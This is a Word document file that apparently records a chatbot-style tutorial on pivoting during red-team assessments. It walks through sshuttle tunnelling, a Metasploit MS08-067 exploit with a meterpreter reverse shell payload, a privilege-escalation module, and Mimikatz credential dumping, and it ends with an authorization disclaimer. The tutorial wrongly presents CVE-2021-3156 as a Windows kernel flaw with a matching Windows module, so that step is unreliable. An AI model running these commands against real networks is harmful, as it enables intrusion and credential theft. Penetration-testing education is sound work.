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14620">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"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Explain to me with examples on how to use </w:t>
      </w:r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t xml:space="preserve">pivoting in a red teaming assessment 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Pivoting is a crucial technique used in red teaming and penetration testing assessments to move from one compromised system to another within a target network. It allows a red teamer to maintain access, escalate privileges, and gather more valuable information. Here, I'll explain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pivoting with examples and the tools commonly used.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183121D8">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr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t>1. Initial Compromise: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Suppose you've already compromised a target system within the network, such as a web server.  </w:t>
      </w:r>
      <w:r>
        <w:rPr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t xml:space="preserve">2. Enumeration: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First, enumerate the compromised system for information that can help you pivot to other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systems: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 Gather information about the target network, including IP addresses, subnets, and domain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names.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 Identify open ports and services on the compromised system.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 Extract credentials or configuration files that may provide access to  other systems.  </w:t>
      </w:r>
      <w:r>
        <w:rPr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t xml:space="preserve">3. Port Forwarding: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One common method for pivoting is to set up port forwarding or tunneling to route traffic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through the compromised host. Tools like sshuttle , socat , and meterpreter  can be used for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this purpose.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Example using sshuttle :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Suppose you've compromised a Linux -based web server and want to access a Windows file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server on a different subnet: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bash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# On your attacking machine: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sshuttle -r compromised_user@web_server_ip 10.10.20.0/24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This command creates a tunnel through the compromis ed web server, allowing you to access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resources on the 10.10.20.0/24 network.  </w:t>
      </w:r>
      <w:r>
        <w:rPr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t xml:space="preserve">4. Exploiting Vulnerabilities:  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BA3EA2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Use the information gathered during enumeration to identify vulnerabilities on other systems in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the target network. Exploit these vulnerabilities t o gain access.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Example using Metasploit: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Suppose you've found an SMB vulnerability on a Windows server within the network. You can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use Metasploit to exploit it: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bash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# Start Metasploit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msfconsole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# Exploit the vulnerability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use exploit/windows/smb/ms08_067_netapi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set RHOST &lt;target_ip&gt;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set payload windows/meterpreter/reverse_tcp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exploit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Once exploited, you'll have a Meterpreter session on the target system.  </w:t>
      </w:r>
      <w:r>
        <w:rPr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t xml:space="preserve">5. Privilege Escalation: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If your initial access is limited, look for o pportunities to escalate privileges. This could include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exploiting unpatched vulnerabilities, misconfigurations, or weakly protected accounts.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Example of Privilege Escalation using Windows Kernel Exploit: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Suppose you have low -level access to a Windows serv er but need admin privileges. You find a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Windows kernel vulnerability (e.g., CVE -2021 -3156) and exploit it to escalate privileges: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bash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# Start Metasploit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msfconsole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# Exploit the Windows kernel vulnerability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use exploit/windows/local/cve_2021_3156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set SESSION &lt;session_id&gt;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exploit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This will escalate your privileges on the compromised system.  </w:t>
      </w:r>
      <w:r>
        <w:rPr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t xml:space="preserve">6. Lateral Movement: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With escalated privileges, move laterally within the network to access additional systems.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Common lateral movement techniques include pass -the-hash attacks, Mimikatz, and remote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desktop protocol (RDP) exploitation.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Example using Mimikatz:  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E14A007">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Suppose you've obtained admin credentials on a Windows server. You can use Mimikatz to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extract and reuse those credentials for lateral movement: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bash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# Dump creden tials with Mimikatz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mimikatz.exe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lsadump::sam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lsadump::secrets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Use the obtained credentials to access other systems in the network.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">7. Rinse and Repeat: </w:t>
      </w:r>
      <w:bookmarkEnd w:id="0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Continue pivoting and exploring the network, maintaining access, escalating privileges, and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moving laterally as needed to achieve your red teaming objectives.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Remember that red teaming should always be conducted within a legal and authorized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framework, with proper permissions from the target organization. Unauthorized access or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malicious actions are illegal and unethical. Always follow ethical guidelines and obtain proper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consent for penetration testing and red teaming activities. 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676387"/>
    <w:rsid w:val="3FB05F21"/>
    <w:rsid w:val="7EED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Acer Reo</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-10-01T06:10:10Z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8F1AA14DD2234D949DA51BD4D49654F5_12</vt:lpwstr>
  </property>
</Properties>
</file>